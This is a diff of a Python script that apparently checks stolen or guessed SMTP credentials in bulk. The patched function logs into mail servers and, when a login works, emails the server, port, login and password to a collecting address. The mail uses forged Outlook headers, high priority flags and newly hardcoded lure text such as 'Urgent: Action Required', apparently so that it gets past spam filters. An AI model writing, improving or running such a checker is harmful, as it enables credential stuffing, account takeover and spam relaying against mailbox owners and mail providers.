@@ -1,11 +1,6 @@
 #!/usr/local/bin/python3
 
 import socket, threading, sys, ssl, time, re, os, random, signal, queue, base64
-from lorem_text import lorem
-from faker import Faker
-
-fake = Faker()
-
 try:
 	import psutil, requests, dns.resolver
 except ImportError:
@@ -321,51 +316,93 @@ def socket_try_mail(sock, smtp_from, smtp_to, data):
 					return True
 	sock.close()
 	raise Exception(answer)
-	
+
 def generate_random_text():
-    return lorem.words(random.randint(50, 100))
+    # Осмысленные предложения для рандомного текста
+    sentences = [
+        "Thank you for being a valued customer. Your satisfaction is our priority.",
+        "Explore the latest trends in fashion and style with our exclusive collection.",
+        "Your feedback can make a difference! Share your thoughts in our quick survey.",
+        "An exciting offer awaits you to celebrate your loyalty. Don't miss out!",
+        "Quick access to our most popular products and services is just a click away.",
+        "Your account security is of the utmost importance to us. Stay informed.",
+        "A special discount code is enclosed as a token of appreciation. Thank you!",
+        "We've noticed you haven't visited in a while. Here's a special offer to welcome you back.",
+        "Exclusive access to members-only content is now available. Check it out!",
+        "Your account activity summary for the past month is provided for your review.",
+        "An important message about recent changes to our website requires your attention.",
+        "Celebrate your continued support with a personalized recommendation based on your preferences."
+    ]
+
+    # Выбрать случайное предложение
+    return random.choice(sentences)
 
 def generate_random_name():
-    return fake.first_name()
+    # 200 вариаций имен и фамилий
+    names = ["John", "Jane", "Alice", "Bob", "Charlie", "David", "Emma", "Frank", "Grace", "Henry"]
+    surnames = ["Smith", "Johnson", "Williams", "Jones", "Brown", "Davis", "Miller", "Wilson", "Moore", "Taylor"]
 
-def generate_random_lastname():
-    return fake.last_name()
-	
+    # Выбрать случайное имя и фамилию
+    random_name = random.choice(names)
+    random_surname = random.choice(surnames)
+
+    return f"{random_name} {random_surname}"
+
+def generate_random_subject():
+    # Осмысленные темы для рандомного текста
+    subjects = [
+        "Exciting News Inside!",
+        "Your Exclusive Update",
+        "Special Offer Just for You",
+        "Important Account Update",
+        "Discover the Latest Trends",
+        "An Invitation for You",
+        "Your Account Privileges Updated",
+        "Urgent: Action Required",
+        "A Gift Awaits You",
+        "Security Update: Please Read"
+    ]
+
+    # Выбрать случайную тему
+    return random.choice(subjects)
+
 def smtp_connect_and_send(smtp_server, port, login_template, smtp_user, password):
-	global verify_email
-	if is_valid_email(smtp_user):
-		smtp_login = login_template.replace('%EMAILADDRESS%', smtp_user).replace('%EMAILLOCALPART%', smtp_user.split('@')[0]).replace('%EMAILDOMAIN%', smtp_user.split('@')[1])
-	else:
-		smtp_login = smtp_user
-	s = socket_get_free_smtp_server(smtp_server, port)
-	answer = socket_send_and_read(s)
-	if answer[:3] == '220':
-		s = socket_try_tls(s, smtp_server) if port != '465' else s
-		s = socket_try_login(s, smtp_server, smtp_login, password)
-		if not verify_email:
-			s.close()
-			return True
-		headers_arr = [
-			f'From: {generate_random_name()} {generate_random_lastname()} <%s>' % smtp_user,
-    'Resent-From: admin@localhost',
-    'To: ' + verify_email,
-    f'Subject: {generate_random_name()}\'s Important Message',
-    'Return-Path: ' + smtp_user,
-    'Reply-To: ' + smtp_user,
-    'X-Priority: 1',
-    'X-MSmail-Priority: High',
-    'X-Mailer: Microsoft Office Outlook, Build 10.0.5610',
-    'X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1441',
-    'MIME-Version: 1.0',
-    'Content-Type: text/html; charset="utf-8"',
-    'Content-Transfer-Encoding: 8bit'
-		]
-		body = f'{smtp_server}|{port}|{smtp_login}|{password}\n\n{generate_random_text()}'
-		message_as_str = '\r\n'.join(headers_arr+['', body, '.', ''])
-		return socket_try_mail(s, smtp_user, verify_email, message_as_str)
-	s.close()
-	raise Exception(answer)
-
+    global verify_email
+    if is_valid_email(smtp_user):
+        smtp_login = login_template.replace('%EMAILADDRESS%', smtp_user).replace('%EMAILLOCALPART%', smtp_user.split('@')[0]).replace('%EMAILDOMAIN%', smtp_user.split('@')[1])
+    else:
+        smtp_login = smtp_user
+    s = socket_get_free_smtp_server(smtp_server, port)
+    answer = socket_send_and_read(s)
+    if answer[:3] == '220':
+        s = socket_try_tls(s, smtp_server) if port != '465' else s
+        s = socket_try_login(s, smtp_server, smtp_login, password)
+        if not verify_email:
+            s.close()
+            return True
+        random_name = generate_random_name()
+        random_subject = generate_random_subject()
+        headers_arr = [
+            f'From: {random_name} <{smtp_user}>',
+            'Resent-From: admin@localhost',
+            f'To: {verify_email}',
+            f'Subject: {random_subject}',
+            f'Return-Path: {smtp_user}',
+            f'Reply-To: {smtp_user}',
+            'X-Priority: 1',
+            'X-MSmail-Priority: High',
+            'X-Mailer: Microsoft Office Outlook, Build 10.0.5610',
+            'X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1441',
+            'MIME-Version: 1.0',
+            'Content-Type: text/html; charset="utf-8"',
+            'Content-Transfer-Encoding: 8bit'
+        ]
+        random_text = generate_random_text()
+        body = f'{smtp_server}|{port}|{smtp_login}|{password} - {random_text}'
+        message_as_str = '\r\n'.join(headers_arr + ['', body, '.', ''])
+        return socket_try_mail(s, smtp_user, verify_email, message_as_str)
+    s.close()
+    raise Exception(answer)
 def worker_item(jobs_que, results_que):
 	global min_threads, threads_counter, verify_email, goods, smtp_filename, no_jobs_left, loop_times, default_login_template, mem_usage, cpu_usage
 	while True:
